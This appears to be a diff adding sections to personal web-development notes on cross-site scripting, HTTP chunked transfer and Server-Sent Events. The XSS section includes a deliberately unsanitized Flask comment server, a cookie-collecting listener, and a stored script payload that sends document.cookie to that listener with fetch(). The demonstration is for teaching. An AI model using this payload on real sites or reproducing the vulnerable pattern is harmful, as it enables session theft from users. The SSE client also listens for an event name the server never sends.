@@ -709,3 +709,225 @@ For resource that do change, it's best practice to change the URL each time the 
 Consider a HTML file contaning some `file.js` and/or `file.css`.
 You can't serve with this with a reasonable `max-age` because the JS and CSS versions might change and you will want to serve the new versions.
 Therefore it makes sense to send the files with a changing version.
+
+## Cross-site Scripting
+
+The basic idea behind cross-site scripting is that attacker can inject JavaScript into a web page viewed by a victim.
+
+One way is the **persistent XSS attack**.
+
+Consider the following insecure server:
+
+```python
+from flask import Flask, request, make_response, render_template_string
+
+app = Flask(__name__)
+
+# Simulating a storage for comments
+comments = []
+
+@app.route('/set-cookie')
+def set_cookie():
+    response = make_response("<h2>Cookie Set!</h2><p>A cookie has been set.</p>")
+    # Set a harmless cookie
+    response.set_cookie('supersecret', 'information')
+    return response
+
+
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    print(comments)
+
+    if request.method == 'POST':
+        user_comment = request.form['comment']
+        comments.append(user_comment)  # Store the comment
+
+    comments_display = '<br>'.join(comments)
+    response = make_response(render_template_string(f"""
+    <h2>Vulnerable Comment Section</h2>
+    {comments_display}
+    <form method="post">
+        <textarea name="comment"></textarea>
+        <input type="submit" />
+    </form>
+    <p>Visit <a href="/set-cookie">/set-cookie</a> to set a cookie.</p>
+    """))
+    return response
+
+if __name__ == "__main__":
+    app.run(port=5000)
+```
+
+The problem is in the way the comments page is created.
+It doesn't sanitize the comments.
+
+This means that if an attacker can submit an "executable comment" that comment will be executed.
+Of course this would be JavaScript.
+
+For example you could submit this comments:
+
+```
+<script>alert("Hi")</script>
+```
+
+If a victim navigates to this page, he would also see the alert.
+
+More interesting would be stealing the cookies of the client:
+
+```python
+from flask import Flask, request, make_response
+
+app = Flask(__name__)
+
+@app.route('/steal-cookie', methods=['GET'])
+def steal_cookie():
+    stolen_cookie = request.args.get('cookie', '')
+    print(f"Stolen cookie: {stolen_cookie}")
+
+    response = make_response("Cookie stolen!", 200)
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    return "Cookie stolen!", 200
+
+if __name__ == "__main__":
+    app.run(port=5001)
+```
+
+We can now submit this comment:
+
+```
+<script>fetch(`http://localhost:5001/steal-cookie?cookie=${document.cookie}`)</script>
+```
+
+If the victim loads the page now, the page will send a request to `localhost:5001/steal-cookie` together with the victims cookies.
+Now the attacker has the victims cookies.
+
+You should protect against this by sanitizing user input of course.
+However, **Content Security Policy** allows you to add an additional layer of protection.
+
+## HTTP Chunked Transfer
+
+The server:
+
+```python
+from flask import Flask, Response
+from flask_cors import CORS
+import time
+
+app = Flask(__name__)
+CORS(app)
+
+def generate_numbers():
+    """Generator function to yield numbers."""
+    for number in range(1, 11):  # Example: generate numbers 1 to 10
+        yield f"{number}\n"
+        time.sleep(1)  # Simulate a delay
+
+@app.route('/stream')
+def stream():
+    return Response(generate_numbers(), content_type='text/plain')
+
+if __name__ == '__main__':
+    app.run(debug=True)
+```
+
+The client:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Chunked Transfer Encoding Example</title>
+  </head>
+
+  <body>
+    <h1>Streaming Numbers</h1>
+    <div id="numbers"></div>
+
+    <script>
+      async function fetchStream() {
+        const response = await fetch("http://localhost:5000/stream");
+        const reader = response.body.getReader();
+        const decoder = new TextDecoder();
+
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          const text = decoder.decode(value);
+          document.getElementById("numbers").innerText += text;
+        }
+      }
+
+      fetchStream();
+    </script>
+  </body>
+</html>
+```
+
+## Server-Sent Events
+
+The server:
+
+```python
+from flask import Flask, Response
+from flask_cors import CORS
+import time
+
+app = Flask(__name__)
+CORS(app)
+
+def event_stream():
+    for count in range(5):  # Limit the number of messages
+        time.sleep(1)  # simulate some work being done
+        yield f"data: Message {count} at {time.ctime()}\n\n"
+    # After sending the last message, you could send a special event to tell the client to close the connection
+    yield "event: close\n\n"
+
+@app.route('/events')
+def sse_request():
+    return Response(event_stream(), content_type='text/event-stream')
+
+if __name__ == '__main__':
+    app.run(debug=True, threaded=True)
+```
+
+The client:
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SSE Example</title>
+  </head>
+
+  <body>
+    <h1>Server-Side Events Example</h1>
+    <div id="messages"></div>
+    <script>
+      const evtSource = new EventSource("http://localhost:5000/events");
+
+      evtSource.onmessage = function (event) {
+        const messages = document.getElementById("messages");
+        const newElement = document.createElement("div");
+        newElement.textContent = "Message: " + event.data;
+        messages.appendChild(newElement);
+      };
+
+      // Listen for the special "close" event
+      evtSource.addEventListener(
+        "complete",
+        function (event) {
+          evtSource.close(); // Close the connection
+          const messages = document.getElementById("messages");
+          const newElement = document.createElement("div");
+          newElement.textContent = "Stream complete. Connection closed.";
+          messages.appendChild(newElement);
+        },
+        false
+      );
+    </script>
+  </body>
+</html>
+```
